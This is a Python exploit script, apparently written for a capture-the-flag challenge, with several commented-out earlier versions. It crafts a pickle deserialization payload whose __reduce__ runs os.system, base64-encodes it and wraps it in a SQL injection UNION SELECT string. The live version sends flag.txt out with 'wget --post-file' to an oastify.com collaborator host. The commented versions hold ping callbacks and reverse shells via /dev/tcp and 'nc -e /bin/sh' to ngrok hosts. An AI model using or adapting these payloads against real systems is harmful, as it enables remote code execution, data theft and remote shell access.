# import pickle
# import base64
# import requests
# import sys
# import urllib.parse

# class PickleRCE(object):
#     def __reduce__(self):
#         import os
#         command = ("wget --post-file flag.txt 5oun1tvo359uj64bi6ukmqlknbt1hq.oastify.com")
#         return (os.system,(command,))

# # default_url = 'http://127.0.0.1:5000/vulnerable'
# # url = sys.argv[1] if len(sys.argv) > 1 else default_url
# command = '/bin/bash -i >& /dev/tcp/tcp://0.tcp.ap.ngrok.io/14472 0>&1'  # Reverse Shell Payload Change IP/PORT

# pickled = 'pickled'  # This is the POST parameter of our vulnerable Flask app
# payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()  # Crafting Payload
# # requests.post(url, data={pickled: payload})  # Sending POST request
# payload = f"' UNION SELECT '{payload}' -- "
# print(requests.utils.requote_uri(payload))


# import sys
# import base64
# import pickle
# import urllib.parse
# import requests

# class Payload:

#   def __reduce__(self):
#     import os
#     # cmd = ("touch abc.txt")
#     cmd = ("wget --post-file flag.txt b8ktlzfunbt03coh2ceq6w5q7hd81x.oastify.com")
#     return os.system, (cmd,)

# if __name__ == "__main__":

#   payload = base64.b64encode(pickle.dumps(Payload())).decode()

#   payload = f"' UNION SELECT '{payload}' -- "

# #   payload = requests.utils.requote_uri(payload)

#   print(payload)

# import sys
# import base64
# import pickle
# import urllib.parse
# import requests


# class Payload:

#   def __reduce__(self):
#     import os
#     cmd = ("ping l2o3f994hlnaxmirwm8006z01r7kv9.oastify.com")
#     # cmd = ("wget --post-file flag.txt o7w4gzwkv2r424e2pw6m2r7b52bszh.oastify.com")
#     return os.system, (cmd,)

# if __name__ == "__main__":

#   payload = base64.b64encode(pickle.dumps(Payload())).decode()

#   payload = f"' UNION SELECT '{payload}' -- "

#   payload = requests.utils.requote_uri(payload)

#   print(payload)

import sys
import base64
import pickle
import urllib.parse
import requests

class Payload:

  def __reduce__(self):
    import os
    # cmd = ("nc 0.tcp.ap.ngrok.io 16093 -e /bin/sh")
    cmd = ("wget --post-file flag.txt l2o3f994hlnaxmirwm8006z01r7kv9.oastify.com")
    return os.system, (cmd,)

if __name__ == "__main__":

  payload = base64.b64encode(pickle.dumps(Payload())).decode()

  payload = f"' UNION SELECT '{payload}' -- "

  payload = requests.utils.requote_uri(payload)

  print(payload)
